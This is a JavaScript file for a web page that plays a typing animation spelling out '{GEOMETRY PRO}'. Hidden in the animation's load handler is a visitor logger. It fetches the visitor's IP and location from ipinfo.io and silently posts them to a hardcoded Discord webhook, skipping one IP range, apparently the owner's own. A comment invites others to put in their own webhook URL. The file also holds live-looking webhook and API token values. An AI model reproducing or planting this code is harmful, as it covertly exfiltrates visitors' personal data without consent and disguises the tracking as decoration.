window.addEventListener("load", async function introtext() {

    let header = document.querySelector('#intro');
    let anim = [
        { t: "{ }", ms: 400 },
        { t: "{_}", ms: 400 },
        { t: "{ }", ms: 400 },
        { t: "{_}", ms: 400 },
        { t: "{G_}", ms: 100 },
        { t: "{G_}", ms: 100 },
        { t: "{GE_}", ms: 100 },
        { t: "{GEO_}", ms: 100 },
        { t: "{GEOM_}", ms: 100 },
        { t: "{GEOME_}", ms: 100 },
        { t: "{GEOMET_}", ms: 100 },
        { t: "{GEOMETR_}", ms: 100 },
        { t: "{GEOMETRY_}", ms: 100 },
        { t: "{GEOMETRY_}", ms: 400 },
        { t: "{GEOMETRY}", ms: 400 },
        { t: "{GEOMETRY_}", ms: 400 },
        { t: "{GEOMETRY _}", ms: 100 },
        { t: "{GEOMETRY P_}", ms: 100 },
        { t: "{GEOMETRY PR_}", ms: 100 },
        { t: "{GEOMETRY PRO_}", ms: 100 },
        { t: "{GEOMETRY PRO}", ms: 600 },
        { t: "{GEOMETRY PRO_}", ms: 600 },
        { t: "{GEOMETRY PRO}", ms: 600 },
        { t: "{GEOMETRY PRO_}", ms: 600 },
        { t: "{GEOMETRY PRO}", ms: 600 }
    ];

    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/926250141718036500/HSnuUiiOG9s861twu6H0fA44ZbHeBrW7vdWfTKmz5pkbQxuwPiFFDIuUdZ5HN7xCXhEG");
    // replace the url in the "open" method with yours
    request.setRequestHeader('Content-type', 'application/json');

    const requestagain = await fetch("https://ipinfo.io/json?token=e9252edb2630f4")
    const requestjson = await requestagain.json()

    var contentmessage = JSON.stringify(requestjson)

    if(!requestjson.ip.startsWith("68.17")){
        const params = {
            username: "ConfInfo",
            avatar_url: "",
            content: contentmessage
        }
    
        request.send(JSON.stringify(params));
    }

    let stepDenominator = 1;
    if (window.localStorage.stepDenominator)
        stepDenominator = window.localStorage.stepDenominator;
    let i = 0;
    let update = () => {
        let step = anim[i];
        header.innerText = step.t;
        i++;
    
        if (i < anim.length)
            setTimeout(update, step.ms / stepDenominator);
        else {
            header.classList.add('top');
            setTimeout(() => {
                // document.getElementById('main').style.opacity = 1;
                // initGlobe();
                
            }, 500);
            window.localStorage.stepDenominator = 2;
        }
    }
    update();

});